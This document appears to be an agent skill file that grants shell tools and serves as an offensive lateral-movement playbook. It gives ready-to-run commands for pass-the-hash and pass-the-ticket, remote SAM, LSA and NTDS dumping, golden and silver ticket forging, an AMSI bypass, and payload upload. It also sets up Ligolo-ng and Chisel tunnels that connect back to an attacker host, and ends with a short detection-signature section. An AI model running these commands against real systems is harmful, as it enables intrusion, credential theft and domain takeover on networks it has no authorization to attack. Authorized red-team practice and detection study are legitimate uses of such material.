---
name: lateral-movement
description: "Network lateral movement — Pass-the-Hash, Pass-the-Ticket, WMI/WinRM/PsExec/RDP execution, SMB operations, network tunneling with Ligolo-ng and Chisel."
allowed-tools: Bash Read Write
metadata:
  subdomain: lateral-movement
  when_to_use: "lateral movement, pass the hash, pass the ticket, WMI exec, evil-winrm, psexec, pivot, tunnel, Ligolo, Chisel, smbexec"
  tags: lateral, pth, ptt, wmi, winrm, psexec, rdp, smb, pivot, tunnel, ligolo, chisel
  mitre_attack: T1021.002, T1021.006, T1021.001, T1550.002, T1550.003, T1572
---

# Lateral Movement Knowledge Base

Lateral movement uses captured credentials and network access to move between hosts in a compromised environment. Each technique has a different noise profile, artifact footprint, and prerequisite. Choose based on available credentials, target services, and OPSEC requirements.

## Quick Reference
```bash
# Pass-the-Hash — command exec via SMB (CrackMapExec/NetExec)
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' -x 'whoami'

# WMI execution — semi-interactive shell
wmiexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# PsExec — SYSTEM shell via service creation
psexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# Evil-WinRM — PowerShell remoting with hash
evil-winrm -i <TARGET> -u '<USER>' -H '<NTLM_HASH>'

# SMB file operations
smbclient.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# Ligolo-ng tunnel setup
./proxy -selfcert -laddr 0.0.0.0:11601          # Attacker
./agent -connect <ATTACKER_IP>:11601 -ignore-cert # Pivot host
```

## MITRE ATT&CK Mapping

| Technique ID | Name | Tools |
|-------------|------|-------|
| T1550.002 | Pass the Hash | CrackMapExec/NetExec, Impacket, Mimikatz |
| T1550.003 | Pass the Ticket | Rubeus, Mimikatz |
| T1021.002 | SMB/Windows Admin Shares | psexec.py, smbexec.py, smbclient.py |
| T1021.006 | Windows Remote Management | Evil-WinRM |
| T1021.001 | Remote Desktop Protocol | SharpRDP, xfreerdp |
| T1572 | Protocol Tunneling | Ligolo-ng, Chisel |

## 1. Pass-the-Hash (PtH)

### CrackMapExec / NetExec
```bash
# Execute command via SMB using NTLM hash
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' -x 'whoami'

# Execute PowerShell command
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' -X 'Get-Process'

# Check local admin on multiple hosts (spray hash)
nxc smb <SUBNET>/24 -u '<USER>' -H '<NTLM_HASH>' | tee pth_spray_<TARGET>.log

# Dump SAM on remote host after PtH
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' --sam

# Dump LSA secrets remotely
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' --lsa

# Extract NTDS.dit from DC
nxc smb <DC_IP> -u '<USER>' -H '<NTLM_HASH>' --ntds
```

### Impacket PtH Suite
```bash
# psexec with hash — returns SYSTEM shell
psexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# wmiexec with hash — returns user-context shell, fewer artifacts
wmiexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# smbexec with hash — no binary upload, uses service creation
smbexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# atexec with hash — uses scheduled task
atexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> 'whoami'
```

### PtH Method Comparison

| Method | Shell Context | Artifacts | Binary Upload | Noise Level |
|--------|--------------|-----------|---------------|-------------|
| psexec.py | SYSTEM | Service creation (7045), ADMIN$ write | Yes (.exe) | High |
| wmiexec.py | User | WMI process creation, no service | No | Low-Medium |
| smbexec.py | SYSTEM | Service creation, no binary upload | No | Medium |
| atexec.py | SYSTEM | Scheduled task creation | No | Medium |
| nxc -x | User | Depends on exec method | Varies | Medium |

## 2. Pass-the-Ticket (PtT)

### Rubeus — Ticket Import & Use
```powershell
# Import .kirbi ticket into current session
Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Import from .kirbi file
Rubeus.exe ptt /ticket:C:\Windows\Temp\ticket.kirbi

# Request TGT with NTLM hash, then inject
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /ptt

# Request TGT with AES256 key (stealthier — avoids RC4 downgrade detection)
Rubeus.exe asktgt /user:<USER> /aes256:<AES_KEY> /domain:<DOMAIN> /ptt

# List cached tickets
Rubeus.exe triage
Rubeus.exe klist

# Harvest all tickets from memory
Rubeus.exe dump /nowrap
```

### Mimikatz — Ticket Operations
```powershell
# Import .kirbi ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# List cached tickets
mimikatz.exe "kerberos::list" "exit"

# Golden Ticket (requires krbtgt hash — full domain compromise)
mimikatz.exe "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt" "exit"

# Silver Ticket (requires service account hash — specific service access)
mimikatz.exe "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET> /service:cifs /rc4:<SERVICE_HASH> /ptt" "exit"
```

### Linux .ccache Ticket Import
```bash
# Convert .kirbi to .ccache for Linux tools
ticketConverter.py ticket.kirbi ticket.ccache

# Set Kerberos credential cache environment variable
export KRB5CCNAME=ticket.ccache

# Use ticket with Impacket tools
psexec.py -k -no-pass '<DOMAIN>/<USER>@<TARGET>'
wmiexec.py -k -no-pass '<DOMAIN>/<USER>@<TARGET>'
secretsdump.py -k -no-pass '<DOMAIN>/<USER>@<TARGET>'
```

## 3. WMI Execution

### wmiexec.py — Semi-Interactive Shell
```bash
# With password
wmiexec.py '<DOMAIN>/<USER>:<PASS>@<TARGET>'

# With NTLM hash
wmiexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# With Kerberos ticket
export KRB5CCNAME=ticket.ccache
wmiexec.py -k -no-pass '<DOMAIN>/<USER>@<TARGET>'

# Single command execution
wmiexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> 'ipconfig /all'

# Specify output share (default: ADMIN$)
wmiexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> -share C$
```

### Why WMI?
- **No service creation**: Unlike PsExec, WMI does not create a Windows service
- **User context**: Runs as authenticated user, not SYSTEM
- **Fewer artifacts**: No binary uploaded, no service event (7045)
- **Semi-interactive**: Supports interactive command execution

## 4. WinRM — Evil-WinRM

### Evil-WinRM Sessions
```bash
# With password
evil-winrm -i <TARGET> -u '<USER>' -p '<PASS>'

# With NTLM hash (pass-the-hash)
evil-winrm -i <TARGET> -u '<USER>' -H '<NTLM_HASH>'

# With SSL (port 5986)
evil-winrm -i <TARGET> -u '<USER>' -p '<PASS>' -S

# Load PowerShell scripts from directory
evil-winrm -i <TARGET> -u '<USER>' -H '<NTLM_HASH>' -s /opt/scripts/

# Load C# binaries (DLL) for in-memory execution
evil-winrm -i <TARGET> -u '<USER>' -H '<NTLM_HASH>' -e /opt/binaries/
```

### Evil-WinRM In-Session Commands
```powershell
# File transfer
upload payload.exe C:\Windows\Temp\payload.exe
download C:\Windows\Temp\results.txt results.txt

# Load and execute .NET assembly (DLL)
Dll-Loader -http http://<ATTACKER_IP>/SharpHound.exe

# Execute PowerShell script loaded via -s flag
Invoke-Bloodhound -CollectionMethod All

# Bypass AMSI
Bypass-4MSI

# Check services, processes
services
menu
```

### WinRM Prerequisites
```
- Port 5985 (HTTP) or 5986 (HTTPS) must be open
- User must be in "Remote Management Users" group or local admin
- WinRM service must be running on target
- Check: nxc winrm <TARGET> -u '<USER>' -p '<PASS>'
```

## 5. PsExec — Impacket

### psexec.py — Service-Based Execution
```bash
# With password — returns SYSTEM shell
psexec.py '<DOMAIN>/<USER>:<PASS>@<TARGET>'

# With NTLM hash
psexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# Execute specific command (non-interactive)
psexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> 'cmd.exe /c whoami && ipconfig'

# Use C$ share instead of ADMIN$
psexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> -path C:\Windows

# Specify service name (avoid default detection)
psexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH> -service-name 'WinUpdSvc'
```

### PsExec Artifacts
```
- Service binary uploaded to ADMIN$ share
- Service created (Event 7045: "Service was installed")
- Service started then deleted
- Named pipe communication for I/O
- SYSTEM context execution
```

## 6. RDP — Remote Desktop

### SharpRDP (Programmatic RDP — No GUI)
```powershell
# Execute command via RDP without GUI session
SharpRDP.exe computername=<TARGET> command="cmd.exe /c whoami > C:\Windows\Temp\rdp_test.txt" username=<DOMAIN>\<USER> password=<PASS>

# SharpRDP creates a console session and sends keystrokes programmatically
```

### xfreerdp — CLI RDP Client
```bash
# Standard RDP with credentials
xfreerdp /v:<TARGET> /u:'<USER>' /p:'<PASS>' /d:'<DOMAIN>' /cert:ignore /dynamic-resolution

# Pass-the-Hash via RDP (restricted admin mode required)
xfreerdp /v:<TARGET> /u:'<USER>' /pth:<NTLM_HASH> /d:'<DOMAIN>' /cert:ignore

# Enable restricted admin mode remotely (requires admin on target first)
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f'

# RDP with file sharing
xfreerdp /v:<TARGET> /u:'<USER>' /p:'<PASS>' /drive:share,. /cert:ignore
```

## 7. SMB Lateral — File Operations

### smbexec.py — Command Execution via SMB
```bash
# Command shell via service creation (no binary upload)
smbexec.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# Uses cmd.exe output redirection through a share
```

### smbclient.py — File Operations
```bash
# Interactive SMB client
smbclient.py '<DOMAIN>/<USER>@<TARGET>' -hashes :<NTLM_HASH>

# Available commands inside session:
# shares          - list available shares
# use <SHARE>     - connect to a share
# ls              - list directory
# get <FILE>      - download file
# put <FILE>      - upload file
# cd <DIR>        - change directory
# cat <FILE>      - read file content

# Mount SMB share (Linux)
mount -t cifs //<TARGET>/<SHARE> /mnt/smb -o username='<USER>',password='<PASS>',domain='<DOMAIN>'
```

### NetExec SMB Operations
```bash
# List shares
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' --shares

# Spider shares for sensitive files
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' -M spider_plus -o OUTPUT=spider_<TARGET>.json

# Upload file
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' --put-file payload.exe '\\Windows\\Temp\\payload.exe'

# Download file
nxc smb <TARGET> -u '<USER>' -H '<NTLM_HASH>' --get-file '\\Windows\\Temp\\results.txt' results.txt
```

## 8. Network Tunneling & Pivoting

### Ligolo-ng — Modern Tunneling
```bash
# === ATTACKER MACHINE (Proxy) ===
# Start Ligolo proxy with self-signed cert
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# === PIVOT HOST (Agent) ===
# Upload and run agent — connects back to proxy
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# === ATTACKER MACHINE — After agent connects ===
# In Ligolo proxy console:
session                                          # Select the agent session
ifconfig                                         # View pivot host interfaces
start                                            # Start the tunnel

# Add route to internal network through tunnel
sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo

# Now scan/access internal network directly from attacker
nmap -sS -sV -p 445,3389,5985 <INTERNAL_TARGET>
nxc smb <INTERNAL_TARGET> -u '<USER>' -H '<NTLM_HASH>'

# Add listener (reverse shell from internal network back to attacker)
# In Ligolo console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

### Chisel — HTTP Tunnel
```bash
# === ATTACKER MACHINE (Server) ===
./chisel server --reverse -p 8080

# === PIVOT HOST (Client) ===
# SOCKS proxy (route traffic through pivot host)
./chisel client <ATTACKER_IP>:8080 R:1080:socks

# Port forward (specific port)
./chisel client <ATTACKER_IP>:8080 R:9999:<INTERNAL_TARGET>:445

# === ATTACKER MACHINE — Use the tunnel ===
# SOCKS: use proxychains with the tunnel
proxychains nxc smb <INTERNAL_TARGET> -u '<USER>' -H '<NTLM_HASH>'

# Port forward: access directly
smbclient.py '<DOMAIN>/<USER>@127.0.0.1' -hashes :<NTLM_HASH> -port 9999
```

### Proxychains Configuration
```bash
# /etc/proxychains4.conf — add at bottom:
# For Ligolo-ng (no proxychains needed — direct routing)
# For Chisel SOCKS:
socks5 127.0.0.1 1080

# Usage:
proxychains nmap -sT -p 445,3389 <INTERNAL_TARGET>
proxychains evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -H '<NTLM_HASH>'
```

### Tunnel Method Comparison

| Method | Protocol | Speed | Stealth | Setup Complexity |
|--------|----------|-------|---------|-----------------|
| Ligolo-ng | TLS | Fast | High | Medium (tun interface) |
| Chisel | HTTP/WS | Medium | Medium | Low (single binary) |
| SSH (-D) | SSH | Medium | Low | Low (if SSH available) |
| Meterpreter | Custom | Slow | Low | Low (but detectable) |

## Tools & Resources

| Tool | Purpose | Key Flags |
|------|---------|-----------|
| NetExec (nxc) | PtH, spray, enum, file ops | `-H`, `-x`, `-X`, `--shares` |
| psexec.py | SYSTEM shell via service | `-hashes`, `-service-name` |
| wmiexec.py | Semi-interactive user shell | `-hashes`, `-share` |
| smbexec.py | Shell via SMB service | `-hashes` |
| smbclient.py | SMB file operations | `-hashes`, `shares`, `get`, `put` |
| Evil-WinRM | PowerShell remoting | `-H`, `-s`, `-e`, `upload`, `download` |
| Rubeus | Kerberos ticket ops | `ptt`, `asktgt`, `dump`, `triage` |
| Mimikatz | Ticket import, golden/silver | `kerberos::ptt`, `kerberos::golden` |
| SharpRDP | Programmatic RDP exec | `computername=`, `command=` |
| xfreerdp | CLI RDP with PtH | `/pth:`, `/drive:` |
| Ligolo-ng | TLS tunneling agent/proxy | `-selfcert`, `-connect` |
| Chisel | HTTP/SOCKS tunnel | `server --reverse`, `client R:socks` |

## Detection Signatures

| Event ID | Source | Indicator |
|----------|--------|-----------|
| 4624 (Type 3) | Security | Network logon — PtH/remote access |
| 4624 (Type 10) | Security | Remote interactive (RDP) logon |
| 7045 | System | Service installed — PsExec service creation |
| 4648 | Security | Explicit credential logon — alternate credential use |
| 5140 | Security | Network share access — ADMIN$, C$, IPC$ |
| 5145 | Security | Detailed share access — file operations auditing |
| 4688 | Security | Process creation — command execution on target |
| 4697 | Security | Service installed — persistent service-based exec |
| 1 (Sysmon) | Sysmon | Process creation with network parent (WMI, service) |
| 3 (Sysmon) | Sysmon | Network connection — tunnel/pivot traffic patterns |

### Key Detection Patterns
```
# PtH detection: Type 3 logon with NTLM + non-standard source
- EventID: 4624
  LogonType: 3
  AuthenticationPackageName: NTLM (not Kerberos)
  Source: Non-standard workstation

# PsExec detection: Service creation + ADMIN$ access
- EventID: 7045 (service install) + EventID: 5140 (ADMIN$ share access)

# WMI detection: WmiPrvSE.exe spawning child process
- ParentImage|endswith: '\WmiPrvSE.exe'

# Tunnel detection: Single host with sustained high-volume bidirectional traffic
# to external IP on unusual port (11601 for Ligolo, 8080 for Chisel)
```

## Decision Gate

```
Lateral Movement ─┬─► Credential Access
                  │    (dump creds on newly accessed hosts — escalate domain access)
                  │
                  └─► Discovery
                       (enumerate new network segments, AD objects, shares from pivot)
```

**Next steps after successful lateral movement:**
- **New host accessed** → Dump credentials (SAM, LSASS, cached creds) → Credential Access skill
- **Internal network reached** → Enumerate AD, scan internal hosts → Discovery
- **Domain Controller reached** → DCSync, NTDS extraction → Credential Access skill
- **Pivot established** → Scan internal subnets through tunnel → Active Recon skill
- **High-value target found** → Check for privilege escalation paths → Privilege Escalation skill
